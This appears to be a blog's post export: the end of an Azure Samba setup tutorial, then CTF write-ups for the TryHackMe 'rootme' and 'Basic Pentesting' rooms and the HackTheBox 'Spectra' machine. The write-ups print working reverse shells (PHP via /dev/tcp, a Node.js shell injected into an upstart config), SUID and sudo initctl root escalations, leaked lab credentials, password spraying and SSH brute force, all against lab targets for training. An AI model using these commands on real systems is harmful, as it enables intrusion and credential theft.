proceeding further, I\u0026rsquo;ll state that:\n Exposing an SMB Server directly to the Internet is not recommended, or not considered to be \u0026lsquo;best practice\u0026rsquo;. The safest way to make it accessible over the Internet is by setting up a VPN server and putting the SMB inside the VPN network.\n Goals and Outcomes The goal here is exactly the same as what’s written in the title, but by the end of this post, you will be able to:\n Deploy an Ubuntu server in Azure Setup and Configure a Samba server Exposing Samba server over Internet  Prerequisites The one and only prerequisite is:\n Azure Account  Also, since this post won\u0026rsquo;t be detailed step by step, I\u0026rsquo;ll assume that you have:\n Basic knowledge of Azure, at least menu navigation and creating a resource group. Basic knowledge of Linux  Let\u0026rsquo;s jump in!\nVM Configuration \u0026amp; Deploy At this step, I already have a resource group called IAMF_SMB-TEST and I\u0026rsquo;ll be creating a VM instance inside this resource. It\u0026rsquo;s a small server used by 4-5 users, so B1s will be enough. You\u0026rsquo;re free to customize the VM.\nThe VM details of mine can be seen in the following image:\nFor authentication to the server, I\u0026rsquo;ll be using an SSH public key here instead of a password. The account for server administration is called azure-smb. Since the authentication is SSH, this VM will have an SSH port open publicly (internet).\nIn the following section, I\u0026rsquo;ll use a standard SSD and leave the other settings at their defaults.\nIn the Networking section, I\u0026rsquo;ll just create a new virtual network. See the following image for details:\nIn the Management section, because it will be temporary, I\u0026rsquo;ll just disable the boot diagnostics.\nI\u0026rsquo;ll leave the Advanced with the default settings and skip the Tags section.\nThe last section is Review + Create, which basically reviews the VM configuration. After I finish the review, I\u0026rsquo;ll press the Create button.\nWhen the Create button is clicked, the VM will be automatically deployed.\nTest SSH Login The next step is to login to the deployed VM instance via SSH using the previously created username and key/password. The public IP of the VM instance can be found at the Dashboard \u0026gt; RESOURCE_GROUP_NAME \u0026gt; PUBLIC_IP_NAME. In my case, it is Dashboard \u0026gt; IAMF_SMB-TEST \u0026gt; smb-server-ip.\n$ ssh -i private_key azure-smb@PUBLIC_IP_ADDRESS Samba Configuration Installation and Initial Setup First thing first, let\u0026rsquo;s update the repository list.\nazure-smb@smb-server:~$ sudo apt update After that, install Samba with the following command.\nazure-smb@smb-server:~$ sudo apt install samba Once the installation is done, check the Samba service daemon status.\nazure-smb@smb-server:~$ sudo systemctl status smbd ● smbd.service - Samba SMB Daemon Loaded: loaded (/lib/systemd/system/smbd.service; enabled; vendor preset: enabled) Active: active (running) since Thu 2021-05-13 10:17:45 UTC; 3min 48s ago Docs: man:smbd(8) man:samba(7) man:smb.conf(5) Main PID: 2098 (smbd) Status: \u0026#34;smbd: ready to serve connections...\u0026#34; Tasks: 4 (limit: 1056) CGroup: /system.slice/smbd.service ├─2098 /usr/sbin/smbd --foreground --no-process-group ├─2123 /usr/sbin/smbd --foreground --no-process-group ├─2124 /usr/sbin/smbd --foreground --no-process-group └─2129 /usr/sbin/smbd --foreground --no-process-group May 13 10:17:44 smb-server systemd[1]: Starting Samba SMB Daemon... May 13 10:17:45 smb-server systemd[1]: Started Samba SMB Daemon. Samba is ready, and now let\u0026rsquo;s configure the share folder.\nShares Configuration First, let\u0026rsquo;s create a backup file of the original configuration, so we can reset it to the default configuration, just in case something goes wrong.\nazure-smb@smb-server:~$ sudo cp /etc/samba/smb.conf{,.backup} Now create a share folder name it sambashare.\nazure-smb@smb-server:~$ mkdir sambashare Then open the samba configuration file with a text editor like nano.\nazure-smb@smb-server:~$ sudo nano /etc/samba/smb.conf Go straight to the bottom of the file and add the following lines.\n[sambashare] comment = Samba Share path = /home/azure-smb/sambashare read only = no browsable = yes Details for configuring share can be read here or here.\nSave the file and restart the SMB daemon with the following command:\nazure-smb@smb-server:~$ sudo service smbd restart Lastly, update the firewall to allow network traffic for Samba/SMB.\nazure-smb@smb-server:~$ sudo ufw allow samba This is the basic configuration of creating a Samba share, but from here you can create another share with more complex configuration. Here are my references:\n https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/ https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04  Add Samba User Currently, our Linux account for administering the server is azure-smb and we can\u0026rsquo;t use this account password to access the SMB shares yet. Instead, we need to create a password and bind it to azure-smb.\nBut now, let\u0026rsquo;s just create a dedicated user for SMB called user1.\nazure-smb@smb-server:~$ sudo useradd --system -s /usr/sbin/nologin user1 Assign user1 to be the owner of the share\nazure-smb@smb-server:~$ sudo chown user1 /home/azure-smb/sambashare After that, create a Samba password for user1.\nazure-smb@smb-server:~$ sudo smbpasswd -a user1 New SMB password: Retype new SMB password: Added user user1. Finally, enable the user.\nazure-smb@smb-server:~$ sudo smbpasswd -e user1 Enabled user user1. Expose to Internet Allow Inbound Connection Now if we want to make it available on the Internet, we have to go back to the Azure Portal to open the SMB port (445) on the NIC Public IP and allow inbound connection through that port. The connection is then forwarded to our SMB port on the NIC Private IP.\nPUBLIC_IP:445 --\u0026gt; PRIVATE_IP:445 To do that open up the Networking settings of the SMB VM and click on Add inbound port rule button.\nOn the new Windows, configure the rule to allow any source (incoming IP) and any source port (incoming port) to connect to the SMB port (445). The details configuration is as follows:\nAt the bottom, the configuration is as follows:\nWhen you\u0026rsquo;re done, click on the Add button and the new rule should listed in the Inbound port rules section.\nTest Access We can use Nmap to see if the SMB port has been opened.\n$ nmap -p445 -sV VM_PUBLIC_IP To interact with the SMB server via CLI, you can use smbclient. Install it with:\n$ sudo apt install smbclient Once it installed, connect to the share with following command:\n$ smbclient //[IP]/[sharename] Adding -N -L can list all the available shares.\nYou can also provide the password directly in the terminal:\n$ smbclient //[IP]/[sharename] -U [username] [password] $ smbclient //[IP]/[sharename] -U \u0026#39;username%password\u0026#39; And that\u0026rsquo;s all. It is not that detailed, but I hope you will find it useful.\n","permalink":"https://fahmifj.github.io/blog/setup-a-samba-server-in-azure/","summary":"Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.\nIn this post, I’ll share my documentation on how to setup a Samba server in Azure.\nBefore proceeding further, I\u0026rsquo;ll state that:\n Exposing an SMB Server directly to the Internet is not recommended, or not considered to be \u0026lsquo;best practice\u0026rsquo;.","tags":["Azure","Samba","SMB","Linux","Tutorial"],"title":"Setup a Samba Server in Azure and Make It Accessible Over Internet"},{"content":" Room Information   Name: rootme Category: Boot2root Difficulty: Easy Tools:  Nmap Gobuster   Skills Learned:  Web enumeration SUID exploitation     Reconnaissance Nmap A full TCP scan discovers two open ports: SSH on port 22 and HTTP on port 80.\n→ root@kali «rootme» «10.9.30.115» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport 10.10.215.165 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-29 23:35 EDT Nmap scan report for 10.10.215.165 Host is up, received reset ttl 63 (0.26s latency). Not shown: 65533 closed ports Reason: 65533 resets PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Nmap done: 1 IP address (1 host up) scanned in 96.24 seconds Running a script scan didn\u0026rsquo;t really helpful, so I\u0026rsquo;ll dig the website on port 80.\nEnumeration TCP 80 - Website Visiting the website doesn\u0026rsquo;t display anything except a prompt-like text \u0026ldquo;root@rootme:~#\u0026rdquo;.\nGobuster A Gobuster scan discovers several directories on this website, ones of which interesting are /uploads and /panel.\n→ root@kali «rootme» «10.9.30.115» $ gobuster dir -u http://10.10.215.165/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -z =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.215.165/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/05/29 23:37:44 Starting gobuster in directory enumeration mode =============================================================== /js (Status: 301) [Size: 311] [--\u0026gt; http://10.10.215.165/js/] /css (Status: 301) [Size: 312] [--\u0026gt; http://10.10.215.165/css/] /uploads (Status: 301) [Size: 316] [--\u0026gt; http://10.10.215.165/uploads/] /panel (Status: 301) [Size: 314] [--\u0026gt; http://10.10.215.165/panel/] /server-status (Status: 403) [Size: 278] =============================================================== 2021/05/29 23:43:21 Finished =============================================================== /panel On /panel, there is an upload form, but it blocks a file with .php extensions.\nFoothold Shell as www-data Upload filter bypass Uploading a file with extension .phtml bypasses the upload filter. The uploaded file can be found at /uploads/[here].\nReverse shell I\u0026rsquo;ll upload the following file and setup a listener to get a shell.\n→ root@kali «rootme» «10.9.30.115» $ cat iamf.phtml \u0026lt;?php system(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.9.30.115/443 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); I\u0026rsquo;ll trigger reverse shell by visiting  http://10.10.215.165/uploads/iamf.phtml on the browser.\nShell upgrade I\u0026rsquo;ll do the PTY trick to upgrade my shell to interactive one.\nwww-data@rootme:/var/www/html$ which python which python /usr/bin/python www-data@rootme:/var/www/html$ export TERM=xterm export TERM=xterm www-data@rootme:/var/www/html$ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; bash-4.4$ ^Z [1] + 2625 suspended nc -nvlp 443 → root@kali «rootme» «10.9.30.115» $ stty raw -echo; fg [1] + 2625 continued nc -nvlp 443 bash-4.4$ The user flag can be found at /var/www/user.txt.\nbash-4.4$ find / -type f -user www-data 2\u0026gt;/dev/null | grep -v \u0026#39;proc\\|sys\u0026#39; ... /var/www/user.txt ... Privilege Escalation Shell as root I find out the current Python binary has SUID bit set.\nbash-4.4$ find / -type f -perm -u=s 2\u0026gt;/dev/null | grep -v \u0026#39;snap\u0026#39; ... /usr/bin/python ... Python with SUID can be exploited by executing import os; os.execl(\u0026quot;/bin/bash\u0026quot;, \u0026quot;bash\u0026quot;, \u0026quot;-p\u0026quot;):\nbash-4.4$ python -c \u0026#39;import os; os.execl(\u0026#34;/bin/bash\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; bash-4.4# id uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data) I can grab the root flag now.\n Reference(s)  https://gtfobins.github.io/gtfobins/python/  ","permalink":"https://fahmifj.github.io/writeups/tryhackme/thm-rootme/","summary":"Room Information   Name: rootme Category: Boot2root Difficulty: Easy Tools:  Nmap Gobuster   Skills Learned:  Web enumeration SUID exploitation     Reconnaissance Nmap A full TCP scan discovers two open ports: SSH on port 22 and HTTP on port 80.\n→ root@kali «rootme» «10.9.30.115» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport 10.10.215.165 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-29 23:35 EDT Nmap scan report for 10.","tags":["TryHackMe","Linux","Gobuster","sudo","GTFObins","Upload-bypass"],"title":"TryHackMe - rootme"},{"content":"Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I\u0026rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Internal enumeration finds an auto-login password and the password is reused by the user. The user has sudo privileges on initctl, which can be leveraged to get a root shell.\nSkills Learned  Exploiting WordPress Command injection Exploiting sudo privileges on initctl  Tools  Nmap CrackMapExec  Reconnaissance Nmap nmap full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.\n→ root@kali «spectra» «10.10.14.21» $ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-15 10:10 EDT Nmap scan report for 10.10.10.229 Host is up, received echo-reply ttl 63 (0.052s latency). Not shown: 65532 closed ports Reason: 65532 resets PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.1 (protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.17.4 3306/tcp open mysql syn-ack ttl 63 MySQL (unauthorized) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 123.14 seconds MySQL service is normally tied to 127.0.0.1, but nmap already identified that I have no access there.\nRunning a script scan didn\u0026rsquo;t find any interesting information.\nEnumeration TCP 80 - spectra.htb The site appears to be under development.\nInspecting page source discovers a hostname and two directories:\n http://spectra.htb/main/index.php http://spectra.htb/testing/index.php  I\u0026rsquo;ll update my /etc/hosts with the hostname.\n→ root@kali «spectra» «10.10.14.21» $ echo \u0026#39;10.10.10.229 spectra.htb\u0026#39; \u0026gt;\u0026gt; /etc/hosts Poking with curl, shows that with or without the hostname it\u0026rsquo;s the same site.\n→ root@kali «~» «10.10.14.9» $ curl -s http://spectra.htb/ | wc -c 283 → root@kali «~» «10.10.14.9» $ curl -s http://10.10.10.229 | wc -c 283 Clicking on \u0026ldquo;Software Issue Tracker\u0026rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.\nVisiting \u0026ldquo;Test\u0026rdquo;, the site page shows an error message about database connection.\nRemoving index.php from URL, reveals that this page has directory listing enabled.\nThe wp-config.php.save file draws my attention. It contains a set of database credentials.\n→ root@kali «spectra» «10.10.14.21» $ curl http://spectra.htb/testing/wp-config.php.save \u0026lt;?php ...\u0026lt;SNIP\u0026gt;... define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;dev\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;devtest\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;devteam01\u0026#39; ); /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); ...\u0026lt;SNIP\u0026gt;... Foothold Shell as nginx WP-Admin Dashboard The database password works with administrator account (administrator:devteam01), it allows me to access the admin dashboard.\nInjecting Reverse Shell Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I\u0026rsquo;ll inject a reverse shell script in 404.php file of the Twenty Nineteen theme. The file can be found at Appearance \u0026gt; Theme Editor.\nI\u0026rsquo;ll access this URL to get a shell: http://spectra.htb/main/wp-content/themes/twentynineteen/404.php, but it returns an error message pointing on line 12.\nI\u0026rsquo;m able to resolve the error by commenting out the line 12.\nThis time, I\u0026rsquo;ll trigger the reverse shell using curl.\n→ root@kali «spectra» «10.10.14.21» $ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php On my listener.\n→ root@kali «spectra» «10.10.14.21» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.21] from (UNKNOWN) [10.10.10.229] 35166 Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux 09:14:42 up 10:53, 0 users, load average: 0.02, 0.04, 0.00 USER TTY LOGIN@ IDLE JCPU PCPU WHAT uid=20155(nginx) gid=20156(nginx) groups=20156(nginx) $ hostname spectra Shell upgrade My current shell doesn\u0026rsquo;t have PATH variable set, so I have to use the full path to upgrade my shell.\n$ which python3 which: no python3 in ((null)) $ ls /usr/bin/ | grep python python python-config python-wrapper python2 python2.7 python3 python3.6 python3.6m $ /usr/bin/python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; nginx@spectra / $ export TERM=xterm nginx@spectra / $ ^Z [1] + 7285 suspended nc -nvlp 9001 → root@kali «spectra» «10.10.14.21» $ stty raw -echo; fg [1] + 7285 continued nc -nvlp 9001 nginx@spectra / $ To resolve the ((null)) message, I\u0026rsquo;ll add /usr/bin to current PATH variable.\nnginx@spectra / $ env TERM=xterm USER=nginx PWD=/ SHLVL=1 HOME=/home/nginx _=/usr/bin/env nginx@spectra / $ export PATH=$PATH:/usr/bin nginx@spectra / $ which python /usr/local/bin/python Privilege Escalation Shell as katie Internal Enumeration There are 4 users with login shell in this machine.\nnginx@spectra / $ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash nginx:x:20155:20156::/home/nginx:/bin/bash katie:x:20156:20157::/home/katie:/bin/bash Enumerating home directory shows the user flag is on katie\u0026rsquo;s home directory.\nnginx@spectra / $ ls -lR /home 2\u0026gt;/dev/null ...\u0026lt;SNIP\u0026gt;... /home/katie: total 8 drwxr-xr-x 2 katie katie 4096 Jan 15 15:55 log -r-------- 1 katie katie 33 Feb 2 15:57 user.txt ...\u0026lt;SNIP\u0026gt;... All the web files are located in /usr/local/share/nginx/html/.\nnginx@spectra / $ find / -type f -name wp-config.php 2\u0026gt;/dev/null /usr/local/share/nginx/html/main/wp-config.php /usr/local/share/nginx/html/testing/wp-config.php /mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php /mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php The wp-config.php file for /main has different credentials with the one on /testing. I\u0026rsquo;ll grab these credentials.\nnginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php ...\u0026lt;SNIP\u0026gt;... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;dev\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;dev\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;development01\u0026#39; ); ...\u0026lt;SNIP\u0026gt;... In /opt, there is a file with uncommon extension called autologin.conf.orig.\nnginx@spectra /opt $ cat autologin.conf.orig # Copyright 2016 The Chromium OS Authors. All rights reserved. # Use of this source code is governed by a BSD-style license that can be # found in the LICENSE file. description \u0026#34;Automatic login at boot\u0026#34; author \u0026#34;chromium-os-dev@chromium.org\u0026#34; # After boot-complete starts, the login prompt is visible and is accepting # input. start on started boot-complete script passwd= # Read password from file. The file may optionally end with a newline. for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do if [ -e \u0026#34;${dir}/passwd\u0026#34; ]; then passwd=\u0026#34;$(cat \u0026#34;${dir}/passwd\u0026#34;)\u0026#34; break fi done if [ -z \u0026#34;${passwd}\u0026#34; ]; then exit 0 fi ...\u0026lt;SNIP\u0026gt;... Based on the comments, the file is an autologin script. It looks for passwd file in these directories:\n /mnt/stateful_partition/etc/autologin /etc/autologin  And the passwd file in /etc/autologin/ directory contains a password.\nnginx@spectra /opt $ ls -l /etc/autologin/ total 4 -rw-r--r-- 1 root root 19 Feb 3 16:43 passwd nginx@spectra /opt $ cat /etc/autologin/passwd SummerHereWeCome!! SSH - katie I\u0026rsquo;ll spray SummerHereWeCome!! and development01 using crackmapexec to the users who have login shell. Within a few sec, it returns that katie:SummerHereWeCome!! are the valid credentials.\n→ root@kali «spectra» «10.10.14.21» $ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list SSH 10.10.10.229 22 10.10.10.229 [*] SSH-2.0-OpenSSH_8.1 SSH 10.10.10.229 22 10.10.10.229 [-] chronos:devteam01 Bad authentication type; allowed types: [\u0026#39;publickey\u0026#39;, \u0026#39;keyboard-interactive\u0026#39;] SSH 10.10.10.229 22 10.10.10.229 [-] chronos:development01 Bad authentication type; allowed types: [\u0026#39;publickey\u0026#39;, \u0026#39;keyboard-interactive\u0026#39;] SSH 10.10.10.229 22 10.10.10.229 [-] chronos:SummerHereWeCome!! Bad authentication type; allowed types: [\u0026#39;publickey\u0026#39;, \u0026#39;keyboard-interactive\u0026#39;] SSH 10.10.10.229 22 10.10.10.229 [-] katie:devteam01 Bad authentication type; allowed types: [\u0026#39;publickey\u0026#39;, \u0026#39;keyboard-interactive\u0026#39;] SSH 10.10.10.229 22 10.10.10.229 [-] katie:development01 Bad authentication type; allowed types: [\u0026#39;publickey\u0026#39;, \u0026#39;keyboard-interactive\u0026#39;] SSH 10.10.10.229 22 10.10.10.229 [+] katie:SummerHereWeCome!! I\u0026rsquo;m able to login via SSH\n→ root@kali «spectra» «10.10.14.21» $ ssh katie@10.10.10.229 Password: katie@spectra ~ $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers) User flag is done here.\nkatie@spectra ~ $ ls -la total 36 drwxr-xr-x 5 katie katie 4096 May 15 12:17 . drwxr-xr-x 8 root root 4096 Feb 2 15:55 .. lrwxrwxrwx 1 root root 9 Feb 2 15:55 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 katie katie 127 Dec 22 05:46 .bash_logout -rw-r--r-- 1 katie katie 204 Dec 22 05:46 .bash_profile -rw-r--r-- 1 katie katie 551 Dec 22 05:46 .bashrc drwx------ 2 katie katie 4096 May 15 12:17 .gnupg drwx------ 3 katie katie 4096 Jan 15 15:55 .pki drwxr-xr-x 2 katie katie 4096 Jan 15 15:55 log -r-------- 1 katie katie 33 Feb 2 15:57 user.txt Shell as root Internal Enumeration The first thing I will check if I have the user\u0026rsquo;s password is the sudo rights, and this user has one on initctl. Unfortunately, initctl is not listed on GTFObins site, so I\u0026rsquo;ll have to look around.\nkatie@spectra ~ $ sudo -l User katie may run the following commands on spectra: (ALL) SETENV: NOPASSWD: /sbin/initctl Enumerating for files owned by developers discovers some writable .conf files and a JavaScript file.\nkatie@spectra ~ $ find / -type f -group developers -ls 2\u0026gt;/dev/null 32121 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test6.conf 32123 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test7.conf 32109 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test3.conf 32112 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test4.conf 32103 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test.conf 32126 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test8.conf 32128 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test9.conf 32106 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test10.conf 32108 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test2.conf 32120 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test5.conf 32105 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test1.conf 23763 4 -rwxrwxr-x 1 root developers 251 Jun 29 2020 /srv/nodetest.js These .conf files are configuration scripts to start /srv/nodetest.js. The JS file itself is not that important here.\nkatie@spectra ~ $ cat /etc/init/test.conf description \u0026#34;Test node.js server\u0026#34; author \u0026#34;katie\u0026#34; start on filesystem or runlevel [2345] stop on shutdown script export HOME=\u0026#34;/srv\u0026#34; echo $$ \u0026gt; /var/run/nodetest.pid exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js end script pre-start script echo \u0026#34;[`date`] Node Test Starting\u0026#34; \u0026gt;\u0026gt; /var/log/nodetest.log end script pre-stop script rm /var/run/nodetest.pid echo \u0026#34;[`date`] Node Test Stopping\u0026#34; \u0026gt;\u0026gt; /var/log/nodetest.log end script Abusing sudo initctl With sudo privileges and write access on the configuration files, I can perform a command injection to send myself a root shell.\nIn this write-up, I\u0026rsquo;d like to try injecting a node reverse shell.\nFirst, I\u0026rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine and it is without the pre and post script part. I\u0026rsquo;ll name it exploit.conf:\n→ root@kali «exploits» «10.10.14.21» $ cat exploit.conf description \u0026#34;Test node.js server\u0026#34; author \u0026#34;katie\u0026#34; start on filesystem or runlevel [2345] stop on shutdown script export HOME=\u0026#34;/srv\u0026#34; echo $$ \u0026gt; /var/run/nodetest.pid export RHOST=10.10.14.21 export RPORT=9001 exec /usr/local/share/nodebrew/node/v8.9.4/bin/node -e \u0026#39;sh = child_process.spawn(\u0026#34;/bin/sh\u0026#34;); net.connect(process.env.RPORT, process.env.RHOST, function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })\u0026#39; exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js end script After that, I\u0026rsquo;ll transfer the file to Spectra in /dev/shm directory.\n→ root@kali «exploits» «10.10.14.21» $ scp exploit.conf katie@10.10.10.229:/dev/shm Password: bash: warning: /home/katie/.bashrc: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md exploit.conf 100% 775 13.1KB/s 00:00 I\u0026rsquo;ll setup a nc listener on my Kali and execute the following command.\nkatie@spectra /etc/init $ sudo /sbin/initctl stop test5 2\u0026gt;/dev/null; cat /dev/shm/exploit.conf \u0026gt; test5.conf \u0026amp;\u0026amp; sudo /sbin/initctl start test5 test5 start/running, process 33889 If I check my listener, I have a root shell now.\n→ root@kali «spectra» «10.10.14.21» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.21] from (UNKNOWN) [10.10.10.229] 37220 id \u0026amp;\u0026amp; hostname \u0026amp;\u0026amp; ip a uid=0(root) gid=0(root) groups=0(root) spectra 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0 valid_lft forever preferred_lft forever inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic valid_lft 86303sec preferred_lft 14303sec inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr valid_lft 86303sec preferred_lft 14303sec inet6 fe80::250:56ff:feb9:b2c/64 scope link valid_lft forever preferred_lft forever  References  https://www.hackingarticles.in/wordpress-reverse-shell/ https://github.com/pentestmonkey/php-reverse-shell https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-spectra/","summary":"Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I\u0026rsquo;m able to inject a PHP code into a theme file to get a foothold on the system.","tags":["Linux","Chrome-OS","WordPress","Directory-listing","Webshell","Password-reuse","Command-injection","sudo","initctl"],"title":"HackTheBox - Spectra"},{"content":" Room Information   Name: Basic Pentesting Category: Boot2root Type: Challenge/CTF Difficulty: Easy Tools:  Nmap Gobuster John the Ripper smbclient   Skills Learned  Basics of enumeration Brute-force attack     Reconnaissance Nmap nmap full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 \u0026amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).\nEnumeration TCP 445 - SMB Anonymous login is allowed on SMB.\nAccessing anonymous share with anonymous logon finds a text file called staff.txt. I\u0026rsquo;ll grab that file to my machine\nThe contents of staff.txt reveals two potential usernames: jan and kay.\nTCP 80 - Web Poking the web with curl finds out that it is under maintenance.\nGobuster Gobuster scan discovers one hidden directory called development.\n→ root@kali «basic-pentesting» «10.9.30.115» $ gobuster dir -u http://10.10.67.164/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt gobuster/gobuster-S-80 --no-error -z =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.67.164/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/05/29 13:43:47 Starting gobuster in directory enumeration mode =============================================================== /development (Status: 301) [Size: 318] [--\u0026gt; http://10.10.67.164/development/] /development The web has a directory listing enabled on /development, and there are two text files in that directory: dev.txt and j.txt\nj.txt contains a note from K to J.\nFrom the previous SMB enumeration, K and J here are probably Kay and Jan. If so, I could try a brute-force attack on user Jay, since Kay is pointing out that Jan has a weak password.\ndev.txt contains about project development logs.\nFinding Vulnerabilities There are some potential exploits for Apache Structs 2.5.12, which I could try later.\nFoothold For foothold, I have two options: brute force and exploiting Apache Struts.\nBrute force might take some time, so I\u0026rsquo;ll leave it on the background and start with Apache Struts.\nShell as tomcat Apache Struts RCE CVE-2017-9805 Metasploit also has an exploit module for this, so I\u0026rsquo;ll fire up metasploit. But, first, I need to find out the URI of the Apache Struts.\nLooking back to the dev.txt file, it seems Kay uses this example showcase.\nI also came across this blog post and found this:\nI typed http://10.10.67.164/struts2-rest-showcase-2.5.12/ in my browser, and it resolved to this page.\nI tried it with metasploit and it worked!\nShell as jan SSH Brute Force It turns out Hydra finds Jan\u0026rsquo;s SSH password in less than 2 minutes. The password is armando.\n→ root@kali «basic-pentesting» «10.9.30.115» $ hydra -l jan -P /opt/SecLists/Passwords/Common-Credentials/best1050.txt ssh://10.10.245.112 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. ...\u0026lt;SNIP\u0026gt;... [22][ssh] host: 10.10.245.112 login: jan password: armando 1 of 1 target successfully completed, 1 valid password found ...\u0026lt;SNIP\u0026gt;... Hydra 